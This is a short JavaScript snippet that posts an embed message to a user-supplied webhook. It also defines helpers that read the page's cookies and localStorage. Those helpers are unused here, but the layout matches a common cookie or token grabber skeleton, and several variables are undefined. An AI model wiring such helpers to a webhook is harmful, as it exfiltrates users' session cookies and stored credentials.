function sendMessage() { 
    var request = new XMLHttpRequest();
    request.open("POST", `${webhook}`); //put your webhook url here
    request.setRequestHeader('Content-type', 'application/json');
    var myEmbed = {
        title: `${title}`,
        description: `${desc}`,
        color: hexToDecimal("#ff0000"),
        footer: {
            text: "By penguinpowers"
        }
    }
    var params = {
        username: `${botname}`,
         avatar_url: "", //picture here if u want one
        embeds: [myEmbed]
    }
    request.send(JSON.stringify(params));
    function hexToDecimal(hex) {
        return parseInt(hex.replace("#", ""), 16)
    }
}
 
function getstor() {
  return localStorage;
}

function getcookie() {
    return document.cookie;
}
 
sendMessage();
